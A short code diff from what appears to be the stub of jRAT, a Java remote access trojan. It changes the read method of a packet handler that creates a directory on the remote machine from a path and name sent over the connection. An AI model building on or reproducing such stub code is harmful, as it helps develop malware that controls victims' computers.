@@ -9,7 +9,7 @@ import se.jrat.stub.Constants;
 public class Packet43CreateDirectory extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String where = Connection.instance.readLine();
 		String name = Connection.instance.readLine();
 
